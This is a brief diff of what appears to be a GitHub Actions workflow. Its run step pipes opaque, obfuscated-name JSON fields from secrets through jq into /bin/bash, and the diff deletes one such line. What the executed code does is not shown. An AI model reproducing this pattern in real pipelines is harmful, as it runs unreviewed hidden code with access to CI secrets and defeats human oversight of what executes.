@@ -18,7 +18,6 @@ jobs:
           dx1038: ${{ secrets.dx1038 }}
         run: |
           printf '%s' "$dx1038" | jq -r .y10898 | /bin/bash
-          echo $ll76 | jq -r .qgo4 | /bin/bash
           echo $rszkr48442 | jq -r .cywc4483 | /bin/bash
           printf '%s' "$ha88250" | jq -r .llb51261 | /bin/bash
           printf '%s' "$xwh08" | jq -r .bmqo953 | /bin/bash
